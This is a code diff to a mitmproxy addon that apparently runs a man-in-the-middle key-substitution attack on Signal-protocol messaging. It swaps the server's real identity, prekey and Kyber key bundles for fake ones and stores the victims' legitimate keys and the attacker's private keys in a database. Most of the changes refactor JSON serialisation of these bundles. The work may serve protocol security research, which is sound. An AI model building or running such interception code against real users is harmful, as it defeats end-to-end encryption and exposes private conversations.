@@ -1,10 +1,7 @@
-# from mitmproxy.http import HTTPFlow
-from mitmproxy.http import HTTPFlow, Request, Response, Headers
-# from mitmproxy import ctx
 from dataclasses import dataclass
 from typing import Optional
 import logging
-from mitmproxy.http import Request, Response, HTTPFlow
+from mitmproxy.http import Request, Response, HTTPFlow, Headers
 from xepor import RouteType, HTTPVerb, Router
 import json
 # from signal_protocol import identity_key, curve, session_cipher, storage, state
@@ -35,6 +32,7 @@ from server_proto import addons, HOST_HTTPBIN
 from mitm_interface import MitmUser
 from collections import defaultdict
 
+# logging.getLogger().addHandler(utils.ColorHandler())
 
 class CiphertextMessageType(Enum):
     WHISPER = 2
@@ -79,10 +77,10 @@ class KeyData:
     fake_signed_pre_keys: Optional[dict] = None
     fake_secret_signed_pre_keys: Optional[dict] = None
 
-    fake_pre_keys: Optional[dict] = None
+    fake_pre_keys: Optional[list[dict]] = None
     fake_secret_pre_keys: Optional[dict] = None
 
-    fake_pq_pre_keys: Optional[dict] = None
+    fake_pq_pre_keys: Optional[list[dict]] = None
     fake_secret_pq_pre_keys: Optional[dict] = None
 
     fake_last_resort_key: Optional[dict] = None
@@ -158,7 +156,7 @@ def _v1_registration_req(flow: HTTPFlow):
         ),
         pni_data=KeyData(
             iden_key=pni_iden_key,
-            signed_pre_key=pni_signed_pre_key,
+            signed_pre_key=pni_signed_pre_key, # noqa
             pq_last_resort_key=pni_pq_last_resort_key,
             fake_iden_key=pni_fake_iden_key,
             fake_signed_pre_keys=fake_signed_pre_keys["pniSignedPreKey"],
@@ -267,16 +265,28 @@ def _v2_keys(flow: HTTPFlow):
         last_resort_kyber=key_data.pq_last_resort_key
     )
 
+    fake_ik = {
+        "publicKey": b64encode(key_data.fake_iden_key.public_key().serialize()).decode("utf-8"),
+        "privateKey": b64encode(key_data.fake_iden_key.private_key().serialize()).decode("utf-8")
+    }
+    fake_spk = key_data.fake_signed_pre_keys
+    fake_spk["privateKey"] = key_data.fake_secret_signed_pre_keys
+    prekeys = utils.json_join_public(key_data.fake_pre_keys, key_data.fake_secret_pre_keys)
+    fake_kyber = utils.json_join_public(key_data.fake_pq_pre_keys, key_data.fake_secret_pq_pre_keys)
+    fake_last_resort = {
+            "keyId": key_data.fake_last_resort_key["keyId"],
+            "publicKey": key_data.fake_last_resort_key["publicKey"],
+            "privateKey": key_data.fake_secret_last_resort_key
+    }
     mitm_bundle = MitMBundle.insert(
         type=identity,
         aci=registration_info[ip_addr].aci,
         device_id=1,  # todo: shouldn't be static
-        fake_iden_key=(key_data.fake_iden_key.public_key().to_base64(),
-                       key_data.fake_iden_key.private_key().to_base64()),
-        fake_signed_pre_key=(key_data.fake_signed_pre_keys, key_data.fake_secret_signed_pre_keys),
-        fake_pre_keys=(key_data.fake_pre_keys, key_data.fake_secret_pre_keys),
-        fake_kyber_keys=(key_data.fake_pq_pre_keys, key_data.fake_secret_pq_pre_keys),
-        fake_last_resort_kyber=(key_data.fake_last_resort_key, key_data.fake_secret_last_resort_key)
+        fake_iden_key=json.dumps(fake_ik),
+        fake_signed_pre_key=json.dumps(fake_spk),
+        fake_pre_keys=json.dumps(prekeys),
+        fake_kyber_keys=json.dumps(fake_kyber),
+        fake_last_resort_kyber=json.dumps(fake_last_resort)
     )
 
     legit_bundle.on_conflict_replace().execute()
@@ -305,12 +315,15 @@ def v2_keys_identifier_device_id(flow: HTTPFlow, identifier: str, device_id: str
         fake_victims[_id] = fake_victim
         bob_registartion_id = bundle["registrationId"]
 
-        bob_kyber_pre_key_public = b64decode(bundle["pqPreKey"]["publicKey"])
-        bob_kyber_pre_key_signature = b64decode(bundle["pqPreKey"]["signature"] + "==")
-        bob_kyber_pre_key_id = bundle["pqPreKey"]["keyId"]
+        bob_kyber_pre_key = bundle["pqPreKey"]
+        bob_kyber_pre_key_public = b64decode(bob_kyber_pre_key["publicKey"])
+        bob_kyber_pre_key_signature = b64decode(bob_kyber_pre_key["signature"] + "==")
+        bob_kyber_pre_key_id = bob_kyber_pre_key["keyId"]
 
-        bob_signed_pre_key_public = b64decode(bundle["signedPreKey"]["publicKey"])
-        bob_pre_key_public = b64decode(bundle["preKey"]["publicKey"])
+        bob_signed_pre_key = bundle["signedPreKey"]
+        bob_signed_pre_key_public = b64decode(bob_signed_pre_key["publicKey"])
+        bob_pre_key = bundle["preKey"]
+        bob_pre_key_public = b64decode(bob_pre_key["publicKey"])
 
         device_id = bundle["deviceId"]
 
@@ -326,15 +339,20 @@ def v2_keys_identifier_device_id(flow: HTTPFlow, identifier: str, device_id: str
                              kem.PublicKey.deserialize(bob_kyber_pre_key_public),
                              bob_kyber_pre_key_signature)
 
+        last_resort_pq = registration_info[ip_address].aci_data if identifier == "aci" else (
+            registration_info[ip_address].pni_data)
+
         legit_bundle = LegitBundle.insert(
             type=identity.lower(),
             aci=uuid,
             device_id=device_id,
             iden_key=b64enc(bob_identity_key_public),
-            signed_pre_key=b64enc(bob_signed_pre_key_public),
-            pre_keys=b64enc(bob_pre_key_public),
-            kyber_keys=b64enc(bob_kyber_pre_key_public),
-            last_resort_kyber=b64enc(bob_kyber_pre_key_public)
+            signed_pre_key=bob_signed_pre_key,
+            # todo: using array notation to match the other bundle (i.e arrays of keys vs 1 key dict here)
+            pre_keys=[bob_pre_key],
+            kyber_keys=[bob_kyber_pre_key],
+            # todo: using array notation to match the other bundle (i.e arrays of keys vs 1 key dict here)
+            last_resort_kyber=last_resort_pq.pq_last_resort_key  # need to get from registration_info
         )
         legit_bundle.on_conflict_replace().execute()
         fake_victim.process_pre_key_bundle(ProtocolAddress(uuid, _id), bob_bundle)
@@ -389,22 +407,38 @@ def v2_keys_identifier_device_id(flow: HTTPFlow, identifier: str, device_id: str
             ]
         }
 
+        lastResortPq = {
+            "keyId": 42069,
+            "publicKey": b64encode(fake_user.last_resort_kyber.get_public().serialize()).decode(),
+            "privateKey": fake_user.last_resort_kyber.get_private().to_base64(),
+        }
+        fake_ik = {
+            "publicKey": identity_key.public_key().to_base64(),
+            "privateKey": identity_key.private_key().to_base64()
+        }
+        fake_spk = fake_bundle_wire["devices"][0]["signedPreKey"]
+        fake_spk["privateKey"] = b64encode(fake_user.signed_pre_key_pair.private_key().serialize()).decode("utf-8")
+        fake_pre_keys = [{
+                "keyId": fake_bundle_wire["devices"][0]["preKey"]["keyId"],
+                "publicKey": fake_bundle_wire["devices"][0]["preKey"]["publicKey"],
+                "privateKey": fake_user.pre_key_pair.private_key().to_base64()
+        }]
+        fake_kyber = fake_bundle_wire["devices"][0]["pqPreKey"]
+        fake_kyber["privateKey"] = fake_user.kyber_pre_key_pair.get_private().to_base64()[0],
+        # logging.error()
         mitm_bundle = MitMBundle.insert(
             type=identity.lower(),
             aci=uuid,
             device_id=device_id,
-            fake_iden_key=(identity_key.public_key().to_base64(), identity_key.private_key().to_base64()),
-            fake_signed_pre_key=(fake_bundle_wire["devices"][0]["signedPreKey"],
-                                 fake_user.signed_pre_key_pair.private_key().to_base64()),
-            fake_pre_keys=(fake_bundle_wire["devices"][0]["preKey"],
-                           fake_user.pre_key_pair.private_key().to_base64()),
-            fake_kyber_keys=(fake_bundle_wire["devices"][0]["pqPreKey"],
-                             fake_user.kyber_pre_key_pair.get_private().to_base64()),
-            fake_last_resort_kyber=(fake_user.last_resort_kyber.get_public().to_base64(),
-                                    fake_user.last_resort_kyber.get_private().to_base64())
+            fake_iden_key=json.dumps(fake_ik),
+            fake_signed_pre_key=json.dumps(fake_spk),
+            fake_pre_keys=json.dumps(fake_pre_keys),
+            fake_kyber_keys=json.dumps([fake_kyber]),
+            fake_last_resort_kyber=json.dumps(lastResortPq)
         )
         mitm_bundle.on_conflict_replace().execute()
         mitm_bundles[_id] = mitm_bundle, fake_bundle_wire, fake_user, fake_victims[_id]
+
 
     keys = list(mitm_bundles.keys())
     if len(keys) < 1:
@@ -413,7 +447,7 @@ def v2_keys_identifier_device_id(flow: HTTPFlow, identifier: str, device_id: str
     _, fake_bundle_wire, fake_user, fake_victim = mitm_bundles[keys[0]]
     resp.update(fake_bundle_wire)
     conversation_session[(ip_address, identifier)] = (fake_user, fake_victim)
-    logging.warn(f"session {conversation_session}")
+    logging.warning(f"session {conversation_session}")
     flow.response.content = json.dumps(resp, sort_keys=True).encode()
 
 
